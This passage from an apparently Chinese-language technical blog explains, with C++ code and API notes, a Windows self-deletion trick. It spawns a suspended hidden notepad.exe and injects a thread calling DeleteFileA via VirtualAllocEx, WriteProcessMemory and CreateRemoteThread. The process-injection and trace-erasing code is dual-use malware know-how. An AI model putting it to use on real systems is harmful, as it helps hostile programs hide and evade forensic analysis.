<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//为函数开辟一块内存</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LPVOID pRemoteParam </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, pRemoteParam, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD RETSIZE;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//为参数开辟一块内存</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HANDLE Thread </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateRemoteThread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, (LPTHREAD_START_ROUTINE)ADDRESS, pRemoteParam, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">RETSIZE);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//执行该线程</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">CloseHandle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(Thread);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//关闭句柄</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>使用 <code>CreateProcessA</code> 创建一个挂起的 <code>notepad.exe</code> 进程。</li><li>初始化 <code>DeleteStruct</code> 结构体，设置 <code>dwDeleteFile</code> 为 <code>DeleteFileA</code> 函数的地址，并设置 <code>dwDeleteFile_param_1</code> 为当前可执行文件的路径。</li><li>使用 <code>VirtualAllocEx</code> 和 <code>WriteProcessMemory</code> 在远程进程中分配内存并写入 <code>threadProc</code> 函数和参数。</li><li>使用 <code>CreateRemoteThread</code> 在远程进程中创建线程，执行 <code>threadProc</code> 函数，该函数会删除当前可执行文件。</li></ul><hr><ul><li><p>创建新进程</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">STARTUPINFOA si </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">PROCESS_INFORMATION  pi </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>STARTUPINFOA</code>：指定新进程的主窗口的属性。</li><li><code>PROCESS_INFORMATION</code>：接收新进程和其主线程的标识符。</li></ul><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">CreateProcessA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;c:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">windows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">system32</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">notepad.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, TRUE, CREATE_NO_WINDOW </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">|</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> CREATE_SUSPENDED, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">si, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">pi);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>创建一个新的进程，此处是 <code>notepad.exe</code>, 参数 <code>CREATE_SUSPENDED</code> 表示新进程创建后处于挂起状态。</p><hr><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191538894.png" alt="image-20240719153820688"></p><p><code>CreateProcessA</code> 是用于创建一个新的进程和其主线程的函数。在这里，它被用来创建 <code>notepad.exe</code> 进程。</p><ul><li><p><code>lpApplicationName</code>: 指向一个以 null 结尾的字符串，指定可执行模块的名称</p><p>这里是 <code>&quot;c:\\\\windows\\\\system32\\\\notepad.exe&quot;</code> 表示要创建的进程是 Notepad</p></li><li><p><code>lpCommandLine</code>: 指向一个以 null 结尾的字符串，作为命令行参数传递给新进程</p><p>这里为 <code>0</code>，表示没有额外的命令行参数</p></li><li><p><code>lpProcessAttributes</code>: 指向 <code>SECURITY_ATTRIBUTES</code> 结构体，定义新进程的安全属性。</p><p>这里为 <code>0</code>，表示使用默认安全属性。</p></li><li><p><code>lpThreadAttributes</code>: 指向 <code>SECURITY_ATTRIBUTES</code> 结构体，定义新进程的主线程的安全属性</p><p>这里为 <code>0</code>，表示使用默认安全属性。</p></li><li><p><code>bInheritHandles</code>: 如果为 <code>TRUE</code>，则新进程将继承调用进程的句柄</p><p><code>句柄</code>: 在操作系统中，句柄（Handle）是一个用于标识系统资源的抽象引用。句柄本质上是一个唯一的整数值，由操作系统生成并返回给应用程序，以便应用程序可以在后续操作中引用特定的资源。在 Windows 操作系统中，句柄用于标识各种系统资源，包括进程、线程、文件、窗口、内存等</p><hr><p><code>句柄继承</code>: 句柄继承是指一个进程（父进程）在创建另一个进程（子进程）时，允许子进程继承父进程的句柄。这意味着子进程可以访问和使用这些句柄，以便执行操作。</p><p>句柄继承在进程间通信和资源共享中非常有用。例如，父进程可以创建一个文件句柄，并允许子进程继承这个句柄，以便子进程能够读写同一个文件。</p><hr></li><li><p><code>dwCreationFlags</code>: 控制新进程的优先级和创建状态</p><p>这里使用了两个标志</p><ul><li><p><code>CREATE_NO_WINDOW</code>：不为新进程创建窗口。</p></li><li><p><code>CREATE_SUSPENDED</code>：创建的进程将处于挂起状态，直到调用 <code>ResumeThread</code> 函数。</p><p><code>挂起状态</code>: 进程处于挂起状态（Suspended State）是指进程已经创建但未开始执行。这意味着操作系统已经为进程分配了必要的资源，并且进程已经在系统中注册，但进程中的线程没有开始执行任何代码。</p><p>创建挂起状态的进程通常用于以下目的</p><ul><li><strong>配置初始化：</strong> 可以在进程启动前进行一些必要的初始化配置，如设置环境变量、注入代码或修改进程的内存。</li><li><strong>远程线程注入：</strong> 在挂起状态下，可以在进程内存空间中注入自定义代码或线程，然后恢复进程执行。</li><li><strong>同步操作：</strong> 在某些情况下，父进程需要在子进程启动前完成一些操作，因此需要子进程处于挂起状态。</li></ul></li></ul></li><li><p><code>lpEnvironment</code>: 指向新进程的环境块</p><p>这里为 <code>0</code>，表示使用调用进程的环境。</p></li><li><p><code>lpCurrentDirectory</code>: 指向一个以 null 结尾的字符串，指定新进程的工作目录</p><p>这里为 <code>0</code>，表示使用调用进程的工作目录。</p></li><li><p><code>lpStartupInfo</code>: 指向 <code>STARTUPINFOA</code> 结构体，该结构体指定新进程的主窗口的属性</p><p><code>si</code> 是一个使用 <code>{0}</code> 初始化的 <code>STARTUPINFOA</code> 结构体。</p><ul><li><code>si.cbSize</code>：在调用 <code>CreateProcessA</code> 时，结构体的 <code>cbSize</code> 成员必须设置为结构体的大小。尽管这里未显式设置，<code>CreateProcessA</code> 内部会设置该值。</li><li>虽然大部分成员为默认值，但 <code>CreateProcessA</code> 需要这个结构体来获取新进程的启动信息。</li></ul></li><li><p><code>lpProcessInformation</code>: 指向 <code>PROCESS_INFORMATION</code> 结构体，该结构体接收新进程和其主线程的标识符。在这里，<code>pi</code> 是一个已经初始化的 <code>PROCESS_INFORMATION</code> 结构体。</p><ul><li><code>pi</code> 结构体用于接收新进程和其主线程的标识符，以及其他与进程相关的信息。<code>CreateProcessA</code> 成功返回后，<code>pi</code> 会包含新进程和线程的句柄和标识符。</li></ul></li></ul><hr></li><li><p>获取删除文件函数指针</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DeleteStruct DS;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> GetProcAddress</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleHandleA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;kernel32.dll&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;DeleteFileA&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MAX_PATH);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>GetModuleHandleA(&quot;kernel32.dll&quot;)</code>：获取 <code>kernel32.dll</code> 模块的句柄。</li><li><code>GetProcAddress</code>：获取 <code>DeleteFileA</code> 函数的地址，并存储在 <code>DS.dwDeleteFile</code> 中。</li><li><code>GetModuleFileNameA</code>: 获取当前进程的文件名并存储在 <code>DS.dwDeleteFile_param_1</code> 中。</li></ul><hr><ul><li><p>定义结构体用于存储删除文件所需的信息</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DeleteStruct DS;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> // 用于存储删除文件所需的信息</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">typedef</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> struct</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> DeleteStruct</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    FARPROC dwDeleteFile;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH];</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote></li></ul><hr><ul><li><p>获取函数地址</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> GetProcAddress</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleHandleA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;kernel32.dll&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;DeleteFileA&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>DS.dwDeleteFile</code> 将存储 <code>DeleteFileA</code> 函数的地址，以便后续调用。</p><ul><li><p><code>GetModuleHandleA(&quot;kernel32.dll&quot;)</code>：获取 <code>kernel32.dll</code> 模块的句柄。这是一个常用的系统 DLL，包含了许多常见的系统函数。该句柄代表 <code>kernel32.dll</code> 模块在当前进程地址空间中的基地址。</p></li><li><p><code>GetProcAddress</code>：从指定的模块中获取指定函数的地址。这里指定的函数是 <code>DeleteFileA</code>，它是 <code>kernel32.dll</code> 中用于删除文件的函数。</p><ul><li><p><code>DeleteFileA</code> 是 Windows API 中的一个函数，用于删除指定的文件。它的原型如下：</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">BOOL WINAPI </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">DeleteFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    _In_ LPCSTR lpFileName</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中 <code>lpFileName</code> 参数是要删除的文件路径。</p></li><li><p><code>GetProcAddress</code> 是一个 Windows API 函数，用于从指定的模块中获取一个函数的地址。</p><ul><li><p>第一个参数是模块的句柄，这里传入的是 <code>kernel32.dll</code> 模块的句柄。</p><p>因为 <code>DeleteFileA</code> 函数是 <code>kernel32.dll</code> 模块中的一部分。为了从一个模块（DLL）中获取某个函数的地址，必须先获得该模块在当前进程中的基地址，这就是模块的句柄。</p></li><li><p>第二个参数是要获取地址的函数名，这里传入的是 <code>&quot;DeleteFileA&quot;</code>，即我们要获取 <code>DeleteFileA</code> 函数的地址。</p></li></ul><p>调用 <code>GetProcAddress</code> 返回一个指向 <code>DeleteFileA</code> 函数的指针。</p></li></ul></li></ul></li><li><p>获取当前模块的文件路径</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MAX_PATH);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>获取当前正在执行的可执行文件的完整路径，并将其存储在 <code>DS.dwDeleteFile_param_1</code> 字符数组中。</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191539004.png" alt="image-20240719153927793"></p><p><strong><code>GetModuleFileNameA</code></strong> 是一个 Windows API 函数，其作用是获取指定模块的文件名。</p><ul><li><p><code>hModule</code>：模块的句柄</p><p>这里是 <code>NULL</code>，函数将返回当前进程的可执行文件的路径。</p></li><li><p><code>lpFilename</code>：指向接收模块路径和文件名的缓冲区的指针。</p></li><li><p><code>nSize</code>：缓冲区的大小，以字符为单位。</p><p><code>MAX_PATH</code> 是一个常量，表示路径的最大长度。这个常量通常定义为 260 字符，以确保缓冲区足够大以容纳完整的路径名。</p></li></ul></li></ul><hr></li><li><p>分配内存并写入远程进程</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LPVOID ADDRESS </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, ADDRESS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">threadProc, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>VirtualAllocEx</code> 为远程进程分配内存，大小为 2048 字节，权限为可执行、可读、可写。</li><li><code>WriteProcessMemory</code> 将 <code>threadProc</code> 函数的代码写入远程进程的分配内存中。</li></ul></li></ul><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191539087.png" alt="image-20240719153954876"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191540988.png" alt="image-20240719154010733"></p><ul><li><p>分配内存并写入参数</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">LPVOID pRemoteParam </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, pRemoteParam, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>为远程进程分配内存以存储 <code>DeleteStruct</code> 参数，并将 <code>DS</code> 写入该内存中。</p></li><li><p>创建远程线程</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD RETSIZE;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">HANDLE Thread </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateRemoteThread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, (LPTHREAD_START_ROUTINE)ADDRESS, pRemoteParam, 